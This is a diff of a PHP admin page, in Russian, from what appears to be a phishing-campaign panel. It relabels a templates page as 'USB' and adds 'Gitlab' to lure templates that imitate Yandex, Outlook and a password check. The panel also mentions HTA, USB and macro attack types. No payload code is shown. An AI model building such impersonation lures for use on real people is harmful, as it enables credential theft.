@@ -126,14 +126,14 @@
                 <div class="row">
                     <div class="col-lg-12">
                         <h1 class="page-header">
-                            Шаблоны <small>(просмотр и выбор шаблонов)</small>
+                            USB
                         </h1>
                         <ol class="breadcrumb">
                             <li>
                                 <i class="fa fa-dashboard"></i>  <a href="../">Статистика</a>
                             </li>
                             <li class="active">
-                                <i class="glyphicon glyphicon-list-alt"></i> Шаблоны
+                                <i class="fa fa-flag"></i> USB</a>
                             </li>
                         </ol>
          
@@ -142,12 +142,10 @@
                     <div class="row">
                 
  <!-- Таблица -->     <div class="col-lg-12">
-                        
-                            <div class="container"> 
-                            <div class="main">
-                            <div>
-                                  <h2>Фишинг</h2>  
-                                </div>
+
+                        <div class="table-responsive">
+                           <div class="footer"></div>
+                            <h3>Описание</h3>
                                 <ul id='og-grid' class='og-grid' style="font-weight: 500">
                           <?php
                     include('../bd.php');
@@ -176,7 +174,7 @@
                                 <input type='hidden' name='title' value='$title'>
                                 <button class='btn btn-default' style='height:24px;padding:2px 2px;color:#555' type='submit'>Go!</button></form>
                             </li>";
-                        if($title == 'Проверка пароля' OR $title == 'Яндекс.Диск' OR $title == 'Outlook' OR $title == 'Яндекс.Паспорт'){  
+                        if($title == 'Проверка пароля' OR $title == 'Яндекс.Диск' OR $title == 'Outlook' OR $title == 'Яндекс.Паспорт' OR $title == 'Gitlab'){  
                       echo "
                              $content";
                       }
@@ -279,22 +277,20 @@
                       
                   }
                   echo "</ul>";
-                    ?>       
-                        
+                    ?>     
+                        </div>
+<!-- /Таблица -->       </div>
                     </div>
-                    </div>
-                    </div>
+                </div>
                 <!-- /.row -->
-            </div>
+
             </div>
             <!-- /.container-fluid -->
 
         </div>
         <!-- /#page-wrapper -->
-    </div>
-    </div>
 
-
+    </div>
     <!-- /#wrapper -->
 
     <!-- jQuery -->
@@ -302,21 +298,7 @@
 
     <!-- Bootstrap Core JavaScript -->
     <script src="../js/bootstrap.min.js"></script>
-    <script src="../js/grid.js"></script>
-<script>
-            $(function() {
-                Grid.init();
-            });
-</script>
-    
-<script type="text/javascript">
-$(document).ready(function(){
-        $("img").click(function() {
-            $("#hta, #usb, #makros").css("height","250px");
-            $( ".og-expander" ).remove();
-        });
-});
-    </script>
+
 </body>
 
 </html>
